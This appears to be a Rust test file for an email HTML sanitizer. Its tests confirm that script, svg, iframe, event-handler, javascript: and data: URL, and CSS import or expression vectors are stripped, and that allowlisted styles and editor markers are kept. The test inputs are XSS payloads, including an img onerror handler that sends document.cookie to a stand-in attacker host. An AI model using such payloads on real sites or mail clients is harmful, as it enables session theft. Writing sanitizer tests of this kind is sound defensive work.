use super::*;

#[test]
fn strips_script_svg_math_and_foreign_object_vectors() {
    let html = r#"<html><body>
        <p>hello</p>
        <script>steal()</script>
        <svg><foreignObject><iframe src="https://evil.test"></iframe></foreignObject></svg>
        <math><mtext><script>steal()</script></mtext></math>
    </body></html>"#;

    let sanitized = sanitize_email_html(html);

    assert!(sanitized.contains("<p>hello</p>"));
    for vector in [
        "<script",
        "<svg",
        "<foreignObject",
        "<math",
        "<iframe",
        "steal()",
    ] {
        assert!(!sanitized.contains(vector), "{vector} must be removed");
    }
}

#[test]
fn strips_dangerous_url_schemes_and_event_handlers() {
    let html = r#"<body>
        <a href="javascript:alert(1)">js</a>
        <a href="data:text/html,<script>alert(1)</script>">data</a>
        <a href="https://ok.example/">ok</a>
        <img src="https://ok.example/pic.png" onerror="alert(1)" onload="alert(2)">
        <div onclick="alert(3)">text</div>
    </body>"#;

    let sanitized = sanitize_email_html(html);

    assert!(!sanitized.contains("javascript:"));
    assert!(!sanitized.contains("data:"));
    assert!(sanitized.contains(r#"href="https://ok.example/""#));
    assert!(sanitized.contains(r#"src="https://ok.example/pic.png""#));
    assert!(!sanitized.to_ascii_lowercase().contains("onerror"));
    assert!(!sanitized.to_ascii_lowercase().contains("onload"));
    assert!(!sanitized.to_ascii_lowercase().contains("onclick"));
}

#[test]
fn style_element_content_loses_imports_and_external_references() {
    let html = r#"<html><head><style>
        @import url("https://tracker.test/steal.css");
        .a { color: red; background-image: url("https://tracker.test/pixel.png"); }
        .b { width: expression(alert(1)); margin: 4px; }
        .c { font-size: \75 rl(https://tracker.test); }
    </style></head><body><p>hi</p></body></html>"#;

    let sanitized = sanitize_email_html(html);

    assert!(sanitized.contains("<style>"));
    assert!(!sanitized.to_ascii_lowercase().contains("@import"));
    assert!(!sanitized.to_ascii_lowercase().contains("url("));
    assert!(!sanitized.to_ascii_lowercase().contains("expression("));
    assert!(!sanitized.contains("tracker.test"));
    assert!(sanitized.contains("color:red;"));
    assert!(sanitized.contains("margin:4px;"));
}

#[test]
fn style_element_drops_non_allowlisted_overlay_properties() {
    let html = r#"<body><style>
        .overlay { position: fixed; z-index: 99999; color: blue; }
    </style><p>content</p></body>"#;

    let sanitized = sanitize_email_html(html);

    assert!(!sanitized.contains("position"));
    assert!(!sanitized.contains("z-index"));
    assert!(sanitized.contains("color:blue;"));
}

#[test]
fn media_query_structure_survives_declaration_filtering() {
    let html = r#"<body><style>
        @media (max-width: 600px) { .a { color: green; position: absolute; } }
    </style><p>content</p></body>"#;

    let sanitized = sanitize_email_html(html);

    assert!(sanitized.contains("@media"));
    assert!(sanitized.contains("color:green;"));
    assert!(!sanitized.contains("position"));
}

#[test]
fn fragments_are_cleaned_without_body_reconstruction() {
    let fragment = r#"<p onclick="alert(1)">Sig</p><script>x()</script><style>.s{color:red;position:fixed}</style>"#;

    let sanitized = sanitize_html_fragment(fragment);

    assert!(sanitized.contains("Sig"));
    assert!(!sanitized.contains("onclick"));
    assert!(!sanitized.contains("<script"));
    assert!(sanitized.contains("color:red;"));
    assert!(!sanitized.contains("position"));
}

#[test]
fn authored_html_strips_event_handler_payloads() {
    // The reported vector: a locally-composed body that reaches
    // `body_html_sanitized` verbatim and executes on every reader's page.
    let authored = r#"<body><p>hi</p><img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)"></body>"#;

    let sanitized = sanitize_authored_html(authored);

    assert!(sanitized.contains("<p>hi</p>"));
    assert!(!sanitized.to_ascii_lowercase().contains("onerror"));
    assert!(!sanitized.contains("attacker.example"));
}

#[test]
fn authored_html_strips_scripts_and_dangerous_schemes() {
    let authored = r#"<div>text</div>
        <script>steal()</script>
        <a href="javascript:alert(1)">js</a>
        <iframe src="https://evil.test"></iframe>
        <style>.a{position:fixed;color:red}</style>"#;

    let sanitized = sanitize_authored_html(authored);

    assert!(sanitized.contains("<div>text</div>"));
    for vector in ["<script", "steal()", "javascript:", "<iframe", "position"] {
        assert!(!sanitized.contains(vector), "{vector} must be removed");
    }
    assert!(sanitized.contains("color:red;"));
}

#[test]
fn authored_html_keeps_editor_round_trip_markers() {
    // Reopening a draft rebuilds Lexical nodes from these; dropping them
    // silently degrades mentions, indentation, and list state.
    let authored = r#"<p style="padding-inline-start:40px" data-lexical-indent="1">indented</p>
        <a href="https://app.macro.com/app/doc/1" data-document-mention="true" data-document-id="1" data-document-name="Spec" data-block-name="doc">Spec</a>
        <div class="macro_quote"><p>quoted</p></div>
        <ol><li value="3">three</li></ol>"#;

    let sanitized = sanitize_authored_html(authored);

    assert!(sanitized.contains(r#"data-lexical-indent="1""#));
    assert!(sanitized.contains("padding-inline-start:40px"));
    assert!(sanitized.contains(r#"data-document-mention="true""#));
    assert!(sanitized.contains(r#"data-document-id="1""#));
    assert!(sanitized.contains(r#"class="macro_quote""#));
    assert!(sanitized.contains(r#"value="3""#));
}

#[test]
fn provider_fetched_html_does_not_gain_data_attributes() {
    // Only the authored path opts into `data-*`; inbound mail must not be able
    // to forge the editor's round-trip markers.
    let inbound = r#"<body><a href="https://evil.test" data-document-mention="true" data-document-id="1">x</a></body>"#;

    let sanitized = sanitize_email_html(inbound);

    assert!(!sanitized.contains("data-document-mention"));
    assert!(!sanitized.contains("data-document-id"));
}
